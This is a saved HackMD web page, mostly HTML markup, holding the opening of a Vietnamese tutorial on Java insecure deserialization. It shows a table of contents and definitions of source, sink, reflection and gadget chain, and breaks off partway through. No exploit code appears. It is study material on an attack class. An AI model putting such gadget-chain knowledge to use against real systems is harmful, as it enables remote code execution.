.nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-radius:18px}.L5Fo6c-sM5MNb{border:0;display:block;left:0;position:relative;top:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px;border-radius:4px;bottom:0;cursor:pointer;left:0;position:absolute;right:0;top:0}.L5Fo6c-bF1uUb:focus{border:none;outline:none}sentinel{}</style><link id="googleidentityservice" type="text/css" media="all" href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/style" rel="stylesheet"><meta http-equiv="origin-trial" content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="></head>

<body style="--hmd-comment-panel-width: 348px;" theme="dark" data-view-theme="dark" class="pretty-comment-panel"><span data-radix-focus-guard="" tabindex="0" style="outline: none; opacity: 0; position: fixed; pointer-events: none;"></span>
    <div id="toasts-container" class="toasts-container z-[2000]"><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div></div>
    <div id="publish-page"><div id="meta-title-tags" class="sticky top-0 z-[1000] w-full max-w-full overflow-hidden"><div class="sticky top-0 flex h-auto min-h-[50px] w-full max-w-full items-center justify-between gap-5 overflow-hidden bg-background-blur px-4 py-2.5 backdrop-blur-[12px]"><div class="flex max-w-[75%] items-center overflow-hidden" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-4" data-state="closed"><div class="min-h-[38px] w-full max-w-full items-center overflow-auto text-text-subtle grid grid-cols-[repeat(auto-fit,_minmax(0,_min-content))] grid-rows-1 text-lg leading-lg gap-0" style="grid-template-columns: repeat(2, minmax(0px, max-content));"><span class="flex max-w-full flex-row items-center gap-0 text-text-default"><button class="p-0 m-0 bg-transparent border-none truncate hocus:text-text-default text-lg leading-lg flex max-w-[208px] flex-row items-center gap-1"><span class="inline-flex flex-shrink-0 justify-center items-center text-[20px] leading-[20px] w-fit h-fit text-icon-subtle"><span class="relative inline-block flex-shrink-0 p-[2px]" style="width: 28px; height: 28px;"><span class="relative flex h-full w-full rounded-full bg-cover bg-center after:absolute after:left-[-2px] after:top-[-2px] after:rounded-full after:border after:border-solid after:border-prime-border after:hidden after:h-[calc(100%+4px)] after:w-[calc(100%+4px)]" style="background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI+PGc+PHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c+PC9zdmc+&quot;);"></span></span></span><span class="truncate"><a class="inline-flex max-w-full text-inherit hocus:text-inherit hocus:no-underline" href="https://hackmd.io/@nhat015" data-state="closed"><span class="truncate text-lg font-semibold leading-lg">ASEN</span></a></span></button></span><span class="flex max-w-full flex-row items-center gap-0 text-text-default"><span class="inline-flex flex-shrink-0 justify-center items-center w-5 h-5 text-[20px] leading-[20px] text-icon-subtle"><svg width="100%" height="100%" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 3.50474C14.0489 3.67733 14.1514 4.05957 13.9788 4.3585L7.10377 16.2664C6.93118 16.5653 6.54893 16.6677 6.25 16.4951C5.95107 16.3225 5.84865 15.9403 6.02124 15.6414L12.8962 3.7335C13.0688 3.43457 13.4511 3.33215 13.75 3.50474Z" fill="currentColor"></path></svg></span><button class="p-0 m-0 bg-transparent border-none flex flex-row items-center truncate hocus:text-text-default text-lg leading-lg gap-1.5 w-full overflow-hidden"><span class="inline-flex flex-shrink-0 justify-center items-center text-[20px] leading-[20px] w-fit h-fit text-icon-subtle"><span class="inline-flex ph" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"><svg width="100%" height="100%" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.6922 6.43281L12.3172 2.05781C12.2591 1.99979 12.1902 1.95378 12.1143 1.92241C12.0384 1.89105 11.9571 1.87494 11.875 1.875H4.375C4.04348 1.875 3.72554 2.0067 3.49112 2.24112C3.2567 2.47554 3.125 2.79348 3.125 3.125V16.875C3.125 17.2065 3.2567 17.5245 3.49112 17.7589C3.72554 17.9933 4.04348 18.125 4.375 18.125H15.625C15.9565 18.125 16.2745 17.9933 16.5089 17.7589C16.7433 17.5245 16.875 17.2065 16.875 16.875V6.875C16.8751 6.7929 16.859 6.71159 16.8276 6.63572C16.7962 6.55985 16.7502 6.4909 16.6922 6.43281ZM12.5 4.00859L14.7414 6.25H12.5V4.00859ZM15.625 16.875H4.375V3.125H11.25V6.875C11.25 7.04076 11.3158 7.19973 11.4331 7.31694C11.5503 7.43415 11.7092 7.5 11.875 7.5H15.625V16.875ZM13.125 10.625C13.125 10.7908 13.0592 10.9497 12.9419 11.0669C12.8247 11.1842 12.6658 11.25 12.5 11.25H7.5C7.33424 11.25 7.17527 11.1842 7.05806 11.0669C6.94085 10.9497 6.875 10.7908 6.875 10.625C6.875 10.4592 6.94085 10.3003 7.05806 10.1831C7.17527 10.0658 7.33424 10 7.5 10H12.5C12.6658 10 12.8247 10.0658 12.9419 10.1831C13.0592 10.3003 13.125 10.4592 13.125 10.625ZM13.125 13.125C13.125 13.2908 13.0592 13.4497 12.9419 13.5669C12.8247 13.6842 12.6658 13.75 12.5 13.75H7.5C7.33424 13.75 7.17527 13.6842 7.05806 13.5669C6.94085 13.4497 6.875 13.2908 6.875 13.125C6.875 12.9592 6.94085 12.8003 7.05806 12.6831C7.17527 12.5658 7.33424 12.5 7.5 12.5H12.5C12.6658 12.5 12.8247 12.5658 12.9419 12.6831C13.0592 12.8003 13.125 12.9592 13.125 13.125Z" fill="currentColor"></path></svg></span></span><span class="truncate"><span class="inline-flex max-w-full" data-state="closed"><span class="truncate text-lg leading-lg">Những điểu về lỗ hổng Java Deserialization vulnerability</span></span></span></button></span></div><div class="px-2"></div></div><span class="flex flex-row gap-3"><button class="rounded px-2.5 py-2 font-normal flex bg-transparent text-text-default border border-solid border-border-default hocus:bg-element-bg-hover hocus:border-element-border-hover hocus:text-text-emphasize focus:shadow-[0_0_0_2px_#77777733] disabled:bg-element-bg-disabled disabled:border-element-border-disabled disabled:text-element-text-disabled disabled:hocus:bg-element-bg-disabled disabled:hocus:border-element-border-disabled disabled:hocus:text-element-text-disabled disabled:border disabled:border-solid disabled:hocus:border disabled:hocus:border-solid community-button ui-view-theme gap-0.5 !py-1.5 !px-2 text-sm leading-sm" data-toggle="tooltip" data-placement="bottom" data-original-title="Select color mode" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-3" data-state="closed"><i class="ph ph-paint-brush text-normal leading-[14px]"></i></button><a href="https://hackmd.io/?utm_source=view-page&amp;utm_medium=logo-nav" class="ui-pretty-logo-home flex whitespace-nowrap text-right font-brand-headline text-lg font-bold text-icon-emphasize hocus:text-text-default hocus:no-underline"><span class="flex items-center justify-center">Try  <img class="h-6 w-auto" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/Logo.svg" alt="HackMD Logo"> HackMD</span></a></span></div></div><div class="ui-infobar container-fluid unselectable hidden-print comment-enabled"><div class="row"><div class="col-xs-12 ui-infobar-inner flex items-start"><div class="ui-infobar__user-info"><ul class="list-inline mb-0 w-full"><li class="w-full"><div class="flex w-full gap-[9px] text-4"><span class="mt-[7px] flex justify-center ui-owner" data-profile="nhat015"> <a class="ui-user-icon m-0 inline-block h-[28px] w-[28px] user-card-popover" target="_blank" href="https://hackmd.io/@nhat015" data-toggle="popover" style="background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI+PGc+PHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c+PC9zdmc+&quot;);" data-original-title="" title=""></a></span><div class="flex w-[calc(100%-32px)] min-w-0 flex-col items-start"><div class="w-auto max-w-full break-words"><a class="text-normal font-semibold leading-normal text-text-emphasize hocus:text-link-text-hover hocus:underline ui-owner user-card-popover" data-profile="nhat015" href="https://hackmd.io/@nhat015" data-toggle="popover" data-original-title="" title="">ASEN</a><div class="follow-button-container inline" data-signin="false"><span class="mx-1"><span class="mr-1">·</span><button class="bg-transparent border-none p-0 font-semibold text-text-subtle ui-signin">Follow</button></span></div></div><div class="flex w-full text-text-subtle [&amp;_a]:text-text-subtle [&amp;_a]:hover:text-text-subtle"><div class="w-auto max-w-full break-words"><span class="ui-status-lastchange [&amp;_a]:text-link-text-default [&amp;_a]:hocus:text-link-text-hover">Last edited by <a class="user user-card-popover" href="https://hackmd.io/@nhat015" data-toggle="popover" data-original-title="" title="">ASEN</a> on <span title="Sun, Aug 31, 2025 10:05 AM">Aug 31, 2025</span></span><span class="ui-lastchange" data-createtime="1752550560574" data-updatetime="1756609552755"></span></div><span class="ui-more-info ml-1.5 inline-flex h-fit p-[1.5px]" data-toggle="popover" style="display: none;" data-original-title="" title=""><i class="h-fit text-[13px] leading-[13px] fa fa-github"></i><div class="more-info-raw hmd-dn"><span class="ui-connectedGithub note-status-row hmd-dn text-text-subtle [&amp;_a]:text-text-subtle [&amp;_a]:hover:text-text-subtle"><span class="flex flex-row gap-1.5"><i class="w-5 text-center text-[20px] leading-lg fa fa-github"></i><a class="ui-synced-text">Linked with GitHub</a></span></span></div></span><a class="ml-1.5 inline-flex h-fit p-[1.5px] text-icon-subtler hocus:no-underline hocus:outline-none" data-toggle="popover" data-placement="bottom" data-html="true" data-content="
            &lt;span class=&#39;flex gap-1.5 text-text-subtle&#39;&gt;
              &lt;i class=&#39;ph-fill ph-globe-hemisphere-west text-[20px] leading-lg&#39; aria-hidden=&#39;true&#39;&gt;&lt;/i&gt;
              &lt;span&gt;Published&lt;/span&gt;
            &lt;/span&gt;" data-trigger="focus" role="button" tabindex="0" data-original-title="" title=""><i class="ph-fill ph-globe-hemisphere-west text-[13px] leading-[13px]" aria-hidden="true"></i></a></div><div class="ui-contributor flex">Contributed by<div class="ml-2 flex items-center gap-1"><a href="https://hackmd.io/@nhat015"><div class="relative rounded-full avatar user-card-popover" data-toggle="popover" style="background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI+PGc+PHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c+PC9zdmc+&quot;); background-size: cover; width: 20px; height: 20px; min-width: 20px; min-height: 20px;" data-original-title="" title=""></div></a></div></div></div></div></li></ul></div><div class="hmd-text-right ui-infobar__actions items-center"><ul class="list-inline mb-0"><li class="!flex"><a class="community-button" title="" data-toggle="tooltip" data-placement="bottom" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><a class="community-button" title="" data-toggle="tooltip" data-placement="bottom" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a><a class="community-button" href="https://hackmd.io/@nhat015/HktihBmLxl#"><i class="ph ph-bell"></i></a></li></ul></div><div class="clearfix"></div></div></div><div class="ui-comment-app" id="hackmd-app" style="right: -64px; width: 64px;"><div id="comment-app"><div class="open-comments open-comments-panel fixed z-[1049] !w-16"><div><button class="m-0 ui-open-comments flex h-[38px] items-center gap-1 p-2.5 bg-background-default text-normal leading-normal text-text-default rounded border border-solid border-border-default hover:bg-element-bg-hover hover:text-text-emphasize"><i class="ph ph-chat-circle-dots text-5 leading-sm" aria-hidden="true"></i><span class="text">0</span></button></div></div><div class="comments-scroller"><div class="ui-comment-parent-container comments-containers"></div></div></div></div></div><div class="ui-comment-app" style="right: -64px; width: 64px;"><div id="comments-panel-portal" style="display: none;"><div class="ui-comment-panel-root flex flex-row-reverse fixed select-text overflow-y-auto overflow-x-hidden transition-all duration-200 top-0 h-[100dvh] max-h-[100dvh] react-resizable" style="width: 348px;"><div class="flex h-full min-w-0 flex-grow flex-col overflow-auto bg-background-sunken"><div class="ui-comment-panel-navbar sticky top-0 z-10 box-border flex flex-col text-4 leading-[16px] border-0 border-b-1 border-solid border-b-border-default border-t-1 border-t-border-default"><div class="flex flex-row items-center justify-between gap-1 bg-background-subtler py-1 pl-2 pr-4"><button class="p-0 m-0 bg-transparent border-none w-[155px] min-w-0 rounded px-3 py-2.5 text-normal leading-normal text-text-default hocus:bg-element-bg-hover hocus:text-text-emphasize" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-2" data-state="closed"><span class="flex flex-row items-center gap-1.5"><span class="flex min-w-0 flex-grow flex-row items-center gap-1.5"><i class="ph ph-chat-circle-dots text-lg leading-sm"></i><span class="min-w-0 flex-grow overflow-hidden overflow-ellipsis whitespace-nowrap text-left">Comments</span></span><i class="ph text-lg leading-sm ph-caret-down"></i></span></button><span class="flex flex-shrink-0 flex-row items-center gap-1.5 text-text-default"><button class="m-0 bg-transparent ui-comment-feedback p-1.5 text-sm leading-sm text-text-default rounded border border-solid border-border-default hocus:bg-element-bg-hover hocus:text-text-emphasize" data-tally-open="wo95EN" data-tally-emoji-text="👋" data-tally-emoji-animation="wave">Feedback</button><button class="rounded p-2.5 text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled" data-toggle="tooltip" data-original-title="Pin right panel"><i class="ph ph-push-pin" aria-hidden="true"></i></button><button class="m-0 bg-transparent border-none inline-flex cursor-pointer items-center justify-center p-1.5 text-[16px] leading-sm"><i class="ph ph-x" aria-hidden="true"></i></button></span></div><div class="flex flex-col gap-2.5 bg-background-primary-subtler p-4.5 border-0 border-t-1 border-solid border-border-default"><span class="text-sm font-semibold leading-sm text-text-emphasize">Log in to edit or delete your comments and be notified of replies.</span><div class="flex flex-row justify-between text-sm font-normal leading-sm [&amp;&gt;a]:text-link-text-default [&amp;&gt;a]:underline [&amp;&gt;a:focus]:text-link-text-hover [&amp;&gt;a:hover]:text-link-text-hover"><a href="https://hackmd.io/join?return=true" class="plausible-event-name=UserNoteCommentSignup">Sign up</a><a class="cursor-pointer">Already have an account? Log in</a></div></div></div><div class="mt-20 flex flex-col items-center gap-5 px-[58.5px] text-center"><span class="px-[30px] py-3"><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/new-comment-placeholder-dark.svg"></span><span class="flex flex-col items-center gap-3"><span class="text-normal font-semibold leading-normal text-text-default">There is no comment</span><span class="text-sm leading-sm text-text-subtle">Select some text and then click Comment, or simply add a comment to this page from below to start a discussion.</span></span></div><div class="flex flex-col gap-2.5 p-2.5"></div><div class="flex-grow"></div><div class="ui-anchorless-comment-input-container sticky bottom-0 w-full border-0 border-solid bg-background-subtler rounded-t-md border-t-1 border-border-default p-4"><div class="flex w-full flex-col gap-2"><div class="ui-comment-input-container relative"><textarea class="invisible absolute w-full resize-none border border-solid p-3 text-normal leading-normal" rows="1" readonly=""></textarea><textarea class="!placeholder:text-text-subtler p-3 text-normal leading-normal text-text-default w-full resize-none rounded-[3px] border border-solid border-border-default bg-background-subtler focus-within:border-border-subtle focus-within:bg-background-default focus:outline-none hocus:border-border-subtle cursor-not-allowed" readonly="" placeholder="You do not have permission to add a comment. Please contact the owner to request access." rows="1" maxlength="1000"></textarea><div class="text-complete-container fixed [&amp;&gt;.dropdown-menu]:!absolute" style="top: 0px;"></div></div><div class="flex-row justify-end gap-1.5 hidden"><button class="rounded py-2 text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-border-default hocus:bg-element-bg-hover hocus:border-element-border-hover hocus:text-text-emphasize focus:shadow-[0_0_0_2px_#77777733] disabled:bg-element-bg-disabled disabled:border-element-border-disabled disabled:text-element-text-disabled disabled:hocus:bg-element-bg-disabled disabled:hocus:border-element-border-disabled disabled:hocus:text-element-text-disabled disabled:border disabled:border-solid disabled:hocus:border disabled:hocus:border-solid px-3.5" data-state="closed">Discard</button><button class="rounded text-normal font-normal leading-normal flex bg-background-primary-default text-white border border-solid border-background-primary-default hover:bg-background-primary-hover hover:border-background-primary-hover focus:bg-background-primary-focus focus:border-background-primary-focus focus:shadow-[0_0_0_2px_#453AFF33] disabled:bg-background-primary-disabled disabled:border-background-primary-disabled disabled:opacity-[0.65] px-[15px] py-[9px]" disabled="" data-state="closed">Send</button></div></div></div></div><span class="ui-right-panel-resize-handle relative cursor-ew-resize select-none pl-[5px] border-0 border-l-1 border-r-2 border-solid border-l-transparent border-r-border-default hocus:border-l-0 hocus:border-r-[3px] hocus:border-r-border-subtler"></span></div></div></div><div id="doc" class="container-fluid markdown-body comment-enabled" data-hard-breaks="true" lang="vi-VN" dir="ltr"><div id="doc-body"><p class="part" data-startline="1" data-endline="1" data-position="0" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="0" data-size="94" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/S1X8pHXUel.jpg" alt="499875939_2193800777758116_7654641646010743849_n" class="offline-handled error-handled image-toolbar-handled" data-position="0" data-size="94" loading="lazy" style="width: auto; height: auto;"></span></p><h1 class="part" data-startline="2" data-endline="2" id="Những-điểu-về-lỗ-hổng-Java-Deserialization-vulnerability" data-id="Những-điểu-về-lỗ-hổng-Java-Deserialization-vulnerability"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#Nh%E1%BB%AFng-%C4%91i%E1%BB%83u-v%E1%BB%81-l%E1%BB%97-h%E1%BB%95ng-Java-Deserialization-vulnerability" title="Những-điểu-về-lỗ-hổng-Java-Deserialization-vulnerability" data-size="56" data-position="97" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="97" data-size="56">Những điểu về lỗ hổng Java Deserialization vulnerability</span></h1><p class="part" data-startline="3" data-endline="3" data-position="154" data-size="0"><strong data-position="154" data-size="0"><span data-position="156" data-size="16">Trương Xuân Nhật</span></strong></p><h2 class="part" data-startline="4" data-endline="4" id="Mục-lục" data-id="Mục-lục"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#M%E1%BB%A5c-l%E1%BB%A5c" title="Mục-lục" data-size="7" data-position="178" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="178" data-size="7">Mục lục</span></h2><p class="part" data-startline="5" data-endline="5" data-position="186" data-size="0"><span data-position="186" data-size="12">I. LÝ THUYẾT</span></p><ol class="part" data-startline="6" data-endline="22" data-position="199" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="6" data-endline="6" data-position="202" data-size="0"><span data-position="202" data-size="23">Một số khái niệm cơ bản</span></li>
<li class="" data-startline="7" data-endline="12" data-position="229" data-size="0"><span data-position="229" data-size="13">Kiến thức nền</span><br>
<span data-position="244" data-size="17">2.1 Serialization</span><br>
<span data-position="263" data-size="19">2.2 Deserialization</span><br>
<span data-position="284" data-size="70">2.3 Quá trình de/serialization trong java thực sự diễn ra như thế nào?</span><br>
<span data-position="356" data-size="18">2.4 Serialize data</span><br>
<span data-position="376" data-size="21">2.5 Java magic method</span></li>
<li class="" data-startline="13" data-endline="13" data-position="416" data-size="0"><span data-position="416" data-size="30">Insecure Deserialization là gì</span></li>
<li class="" data-startline="14" data-endline="14" data-position="450" data-size="0"><span data-position="450" data-size="49">Lý do lỗ hổng Insecure Deserialization phát sinh?</span></li>
<li class="" data-startline="15" data-endline="15" data-position="503" data-size="0"><span data-position="503" data-size="36">Hậu quả của Insecure Deserialization</span></li>
<li class="" data-startline="16" data-endline="16" data-position="543" data-size="0"><span data-position="543" data-size="19">Gadget chain là gì?</span></li>
<li class="" data-startline="17" data-endline="17" data-position="566" data-size="0"><span data-position="566" data-size="15">Java Reflection</span></li>
<li class="" data-startline="18" data-endline="18" data-position="585" data-size="0"><span data-position="585" data-size="19">SerializationDumper</span></li>
<li class="" data-startline="19" data-endline="19" data-position="608" data-size="0"><span data-position="608" data-size="23">Giới thiệu về Ysoserial</span></li>
<li class="" data-startline="20" data-endline="20" data-position="636" data-size="0"><span data-position="636" data-size="24">Công cụ Gadget Inspector</span></li>
<li class="" data-startline="21" data-endline="22" data-position="665" data-size="0"><span data-position="665" data-size="49">Cách ngăn chặn Java Deserialization vulnerability</span></li>
</ol><p class="part" data-startline="23" data-endline="23" data-position="717" data-size="0"><span data-position="717" data-size="24">II. DỰNG MÔI TRƯỜNG TEST</span></p><hr class=""><h2 class="part" data-startline="27" data-endline="27" id="I-LÝ-THUYẾT" data-id="I-LÝ-THUYẾT"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#I-L%C3%9D-THUY%E1%BA%BET" title="I-LÝ-THUYẾT" data-size="12" data-position="751" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="751" data-size="12">I. LÝ THUYẾT</span></h2><h3 class="part" data-startline="28" data-endline="28" id="1-Một-số-khái-niệm-cơ-bản" data-id="1-Một-số-khái-niệm-cơ-bản"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#1-M%E1%BB%99t-s%E1%BB%91-kh%C3%A1i-ni%E1%BB%87m-c%C6%A1-b%E1%BA%A3n" title="1-Một-số-khái-niệm-cơ-bản" data-size="26" data-position="768" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="768" data-size="26">1. Một số khái niệm cơ bản</span></h3><p class="part" data-startline="29" data-endline="29" data-position="795" data-size="0"><span data-position="795" data-size="62">Dưới đây là một số khái niệm mình sẽ nêu ra trước khi vào bài:</span></p><ul class="part" data-startline="30" data-endline="35" data-position="858" data-size="0">
<li class="" data-startline="30" data-endline="30" data-position="860" data-size="0"><strong data-position="860" data-size="0"><span data-position="862" data-size="6">Source</span></strong><span data-position="871" data-size="96">: Là điểm bắt đầu của gadgetchain. Khi deser, java sẽ gọi method readObject() của source Object.</span></li>
<li class="" data-startline="31" data-endline="31" data-position="969" data-size="0"><strong data-position="969" data-size="0"><span data-position="971" data-size="4">Sink</span></strong><span data-position="978" data-size="105">: Là điểm cuối của gadgetchain. Là nơi đến các method hữu ích mà mình mong muốn để có thể RCE, writefile,</span><span class="smartypants" data-position="1082" data-size="3">…</span></li>
<li class="" data-startline="32" data-endline="32" data-position="1088" data-size="0"><strong data-position="1088" data-size="0"><span data-position="1090" data-size="18">Reflection in java</span></strong><span data-position="1111" data-size="206">: Đây là một api của java cho phép truy cập các thông tin của đối tượng(tên class, các field, các method) và chỉnh sửa các field đối tượng(kể cả các field private) trong quá trình runtime. (for more detail:</span><a href="https://www.geeksforgeeks.org/java/reflection-in-java/" target="_blank" rel="noopener"><span data-position="1317" data-size="18">Reflection in Java</span></a><span data-position="1393" data-size="3">,  </span><a href="https://tsublogs.wordpress.com/2023/02/15/javasecurity101-1-java-reflection/" target="_blank" rel="noopener"><span data-position="1396" data-size="8">tsublogs</span></a><span data-position="1484" data-size="2">, </span><a href="https://www.oracle.com/technical-resources/articles/java/javareflection.html" target="_blank" rel="noopener"><span data-position="1486" data-size="6">oracle</span></a><span data-position="1572" data-size="2">, </span><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Field.html" target="_blank" rel="noopener"><span data-position="1574" data-size="5">Field</span></a><span data-position="1653" data-size="2">, </span><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html" target="_blank" rel="noopener"><span data-position="1655" data-size="6">Object</span></a><span data-position="1728" data-size="2">, </span><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html" target="_blank" rel="noopener"><span data-position="1730" data-size="5">Class</span></a></li>
<li class="" data-startline="33" data-endline="33" data-position="1803" data-size="0"><strong data-position="1803" data-size="0"><span data-position="1805" data-size="11">Method call</span></strong><span data-position="1819" data-size="45">: method A gọi method B, method A -&gt; method B</span></li>
<li class="" data-startline="34" data-endline="35" data-position="1866" data-size="0"><strong data-position="1866" data-size="0"><span data-position="1868" data-size="11">Gadgetchain</span></strong><span data-position="1882" data-size="166">: là luồng thực thi, là kết quả khi ta ghép các method call, các field lại với nhau từ source đến sink, tạo ra được luồng thực thi mà mình mong muốn.(for more detail:</span><a href="https://portswigger.net/web-security/deserialization/exploiting#gadget-chains" target="_blank" rel="noopener"><span data-position="2048" data-size="13">Gadget chains</span></a><span data-position="2141" data-size="1">)</span></li>
